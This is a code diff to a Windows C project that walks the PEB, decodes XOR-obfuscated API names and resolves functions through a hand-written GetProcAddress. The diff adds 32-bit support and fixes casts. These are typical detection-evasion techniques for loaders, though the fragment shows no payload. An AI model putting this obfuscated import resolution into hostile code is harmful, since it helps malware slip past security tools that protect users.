@@ -12,14 +12,23 @@ typedef struct _client_id
 
 typedef struct _peb_ldr_data
 {
+#ifdef _M_X64
     BYTE Dummy[32];
+#else
+    BYTE Dummy[20];
+#endif
     LIST_ENTRY InMemoryOrderModuleList;
 } MY_PEB_LDR_DATA;
 
 typedef struct _peb
 {
+#ifdef _M_X64
     BYTE Dummy[16];
     PVOID64 ImageBaseAddress;
+#else
+    BYTE Dummy[8];
+    PVOID ImageBaseAddress;
+#endif
     MY_PEB_LDR_DATA *Ldr;
 } MY_PEB;
 
@@ -63,23 +72,6 @@ typedef enum _SECTION_INHERIT
     ViewUnmap = 2,
 } MY_SECTION_INHERIT,
     *PMY_SECTION_INHERIT;
-
-typedef struct _image_import_descriptor
-{
-    union
-    {
-        DWORD Characteristics;    // 0 for terminating null import descriptor
-        DWORD OriginalFirstThunk; // RVA to original unbound IAT (PIMAGE_THUNK_DATA)
-    } DUMMYUNIONNAME;
-    DWORD TimeDateStamp; // 0 if not bound,
-                         // -1 if bound, and real date\time stamp
-                         //     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)
-                         // O.W. date/time stamp of DLL bound to (Old BIND)
-
-    DWORD ForwarderChain; // -1 if no forwarders
-    DWORD Name;
-    DWORD FirstThunk; // RVA to IAT (if bound this IAT has actual addresses)
-} MY_IMAGE_IMPORT_DESCRIPTOR, *PMY_IMAGE_IMPORT_DESCRIPTOR;
 
 // XORed version of the strings
 char cKernel32[] = {0x5b, 0x55, 0x42, 0x5e, 0x55, 0x5c, 0x3, 0x2, 0x1e, 0x54, 0x5c, 0x5c, 0};
@@ -478,7 +470,7 @@ LPVOID MyGetProcAddressByName(ULONG_PTR ulModuleAddr, CHAR *sProcName)
         ++FunctionName;
 
         HMODULE ForwardedDLL = pLoadLibraryA(DLLFunctionName);
-        lpvProcAddr = MyGetProcAddressByName((BYTE *)ForwardedDLL, FunctionName);
+        lpvProcAddr = MyGetProcAddressByName((ULONG_PTR)ForwardedDLL, FunctionName);
 
         pVirtualFree(DLLFunctionName, 0, MEM_RELEASE);
     }
@@ -516,7 +508,7 @@ LPVOID MyGetProcAddressByOrdinal(ULONG_PTR ulModuleAddr, WORD wOrdinal)
         ++FunctionName;
 
         HMODULE ForwardedDLL = pLoadLibraryA(DLLFunctionName);
-        lpvProcAddr = MyGetProcAddressByName((BYTE *)ForwardedDLL, FunctionName);
+        lpvProcAddr = MyGetProcAddressByName((ULONG_PTR)ForwardedDLL, FunctionName);
 
         pVirtualFree(DLLFunctionName, 0, MEM_RELEASE);
     }
@@ -528,7 +520,7 @@ void PopulateKernelFunctionPtrsByName(LPVOID lpvKernelDLL)
 {
     char cOpenFile[] = {0x7f, 0x40, 0x55, 0x5e, 0x76, 0x59, 0x5c, 0x55, 0};
     MyXor(cOpenFile, 8, key, key_len);
-    pOpenFile = MyGetProcAddressByName((BYTE *)lpvKernelDLL, cOpenFile);
+    pOpenFile = MyGetProcAddressByName(lpvKernelDLL, cOpenFile);
 
     char cLoadLibraryA[] = {0x7c, 0x5f, 0x51, 0x54, 0x7c, 0x59, 0x52, 0x42, 0x51, 0x42, 0x49, 0x71, 0};
     MyXor(cLoadLibraryA, 12, key, key_len);
